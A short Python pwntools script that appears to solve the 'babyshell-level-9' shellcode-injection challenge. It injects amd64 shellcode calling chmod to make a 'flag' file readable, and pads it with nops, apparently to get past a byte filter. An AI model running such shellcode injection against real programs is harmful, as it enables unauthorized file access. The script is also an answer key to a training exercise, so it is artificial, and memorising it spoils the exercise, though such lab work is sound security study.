from pwn import *

p = process('/challenge/babyshell-level-9', aslr=False)
context.update(arch="amd64")

flag = b'flag'[::-1].hex()

shellcode = asm(f'''
push 0x{flag}
push rsp
pop rdi
jmp run

.rept 11
nop
.endr

run:
    push 4
    pop rsi

    push 0x5a
    pop rax
    syscall
''')


print(f"Shellcode length: {len(shellcode)} bytes")

p.send(shellcode)
p.interactive()
